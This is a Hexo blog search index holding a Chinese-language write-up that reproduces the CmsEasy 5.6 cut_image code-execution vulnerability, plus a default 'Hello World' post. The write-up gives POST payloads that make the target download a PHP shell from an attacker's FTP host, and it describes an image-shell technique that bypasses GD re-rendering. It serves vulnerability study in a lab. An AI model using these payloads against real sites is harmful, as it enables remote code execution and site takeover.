<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>CmsEasy之cut-image漏洞复现</title>
      <link href="/2023/02/18/CmsEasy%E4%B9%8Bcut-image%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>/2023/02/18/CmsEasy%E4%B9%8Bcut-image%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="CmsEasy-cut-image-代码执行漏洞"><a href="#CmsEasy-cut-image-代码执行漏洞" class="headerlink" title="CmsEasy cut_image 代码执行漏洞"></a>CmsEasy cut_image 代码执行漏洞</h1><h2 id="起因："><a href="#起因：" class="headerlink" title="起因："></a>起因：</h2><p>前几天打靶场的时候碰到这个cms，通过搜素发现这个cms的5.6版本的cut_image函数存在代码执行漏洞。由于网上的漏洞描述大部分并不是很详细，再加上本人才疏学浅，导致最终花了大量时间终于把这个漏洞成功复现。所以打算写一篇文章来记录一下。</p><h2 id="分析源码"><a href="#分析源码" class="headerlink" title="分析源码"></a>分析源码</h2><p>通过搜索可以知道漏洞发生在网站根目录下的lib&#x2F;default&#x2F;tool_act.php文件中的cut_image这个函数<br><img src="https://s2.loli.net/2023/02/18/1roRl8fsWKwqGH2.png" alt="1.png"></p><p>关键在于下面这一行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$new_name</span>=<span class="variable">$new_name_gbk</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="title class_">Time</span>::<span class="title function_ invoke__">getMicrotime</span>()).<span class="string">&#x27;.&#x27;</span>.<span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;pic&#x27;</span>]));</span><br></pre></td></tr></table></figure><p>由于没有判断pic传参进来的文件名后缀，从而可以getshell。</p><p>但是这里有个地方要注意：</p><ol><li>$_POST[‘pic’]是通过判断前4个字符是不是 http。如果不是，则认为文件是本站文件，会从前面抽取掉baseurl，返回文件相对路径，所以在这里采用ftp协议。</li><li>如果站点不是放在根目录 则需要在payload前面补足 strlen(base_url)+2 位的长度 如果在根目录也要补1位</li><li>通过观察cut_image_action这个函数可以发现，这里POST提交需要同时包含pic、w、h、x1、x2、y1、y2这7个参数。表示的意义如下：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pic --&gt; ftp:// + vps的ip地址 + payload</span><br><span class="line">w=x2=图片宽度</span><br><span class="line">h=y2=图片高度</span><br><span class="line">x1=y1=固定0</span><br></pre></td></tr></table></figure></li></ol><p>第2点举例如下：</p><ul><li><p>如果目标站点类似 <a href="http://example.com/easycms/">http://example.com/easycms/</a><br>网站程序放在子目录，就需要补上strlen(base_url)+2 &#x3D; strlen(‘easy’)+2&#x3D;6位</p><p>post内容如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pic=111111ftp://vpsip/payload.php&amp;w=228&amp;h=146&amp;x1=0&amp;x2=228&amp;y1=0&amp;y2=146</span><br></pre></td></tr></table></figure></li><li><p>如果目标站点类似 <a href="http://example.com/">http://example.com</a><br>网站程序放在根目录，只需要补上1位就可以了</p><p>post内容如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pic=1ftp://vpsip/payload.php&amp;w=228&amp;h=146&amp;x1=0&amp;x2=228&amp;y1=0&amp;y2=146</span><br></pre></td></tr></table></figure></li></ul><h2 id="环境搭建："><a href="#环境搭建：" class="headerlink" title="环境搭建："></a>环境搭建：</h2><ul><li>攻击机：windows11 IP: 192.168.1.5</li><li>目标机：CentOS8   IP: 192.168.52.129</li></ul><ol><li><p>首先通过浏览器访问目标站点<br> <img src="https://s2.loli.net/2023/02/18/v4IcZ7HSLOQVaTb.png" alt="2.png"></p></li><li><p>接下来访问有漏洞的界面<br> <img src="https://s2.loli.net/2023/02/18/eBsRXPua6gpDvhE.png" alt="3.png"></p></li><li><p>准备payload，并添加图片马<br> <img src="https://s2.loli.net/2023/02/18/JgkpCf5HxZmcPRK.png" alt="3.png"></p><p> <img src="https://s2.loli.net/2023/02/18/dsfcBeMyCr4G2i8.png" alt="4.png"></p></li><li><p>确认payload已经添加到图片中，之后修改新生成的图片后缀改为php<br> <img src="https://s2.loli.net/2023/02/18/QubANjio5DrMUdq.png" alt="5.png"></p></li></ol><p>5.使用python启动简易ftp服务器<br>    <img src="https://s2.loli.net/2023/02/18/ewBIbGxhLJlm5dk.png" alt="2.png"></p><p>6.通过POST提交参数<br>    <img src="https://s2.loli.net/2023/02/18/RNDxh6Q54p7MIVy.jpg" alt="3.jpg"></p><p>7.访问发现并没有生效<br>    <img src="https://s2.loli.net/2023/02/18/hXzxO7PtJW2pUQL.jpg" alt="4.jpg"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">之后通过询问其他师傅得知这里用到了php的gd库进行了二次渲染，所以这里需要想办法进行绕过。</span><br></pre></td></tr></table></figure><p>8.首先上传原始的图片文件，之后下载经过gd库处理的图片<br>    <img src="https://s2.loli.net/2023/02/18/NV4HJ7FQnsoeRZx.jpg" alt="5.jpg"></p><p><img src="https://s2.loli.net/2023/02/18/8kSd1g7RIZ5xFPq.jpg" alt="6.jpg"></p><p>9.这里使用脚本加工下载下来的图片<br>    <img src="https://s2.loli.net/2023/02/18/XgnVNGDtZKEOhCs.jpg" alt="7.jpg"></p><p>10.查看脚本生成的图片，里面已经添加了payload<br>    <img src="https://s2.loli.net/2023/02/18/wKTc423RJjoWpeh.jpg" alt="8.jpg"></p><p>11.再次将文件后缀名变更为php，之后上传<br>    <img src="https://s2.loli.net/2023/02/18/yGkWSqRB9FldZC7.jpg" alt="9.jpg"></p><p>12.发现解析成功<br>    <img src="https://s2.loli.net/2023/02/18/FisntoK5UzwdSmB.jpg" alt="10.jpg"></p><p>本人菜鸡一个，第一次写文章。不足之处还请各位大佬多多包涵。</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 cmseasy cut_image </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2022/11/05/hello-world/"/>
      <url>/2022/11/05/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
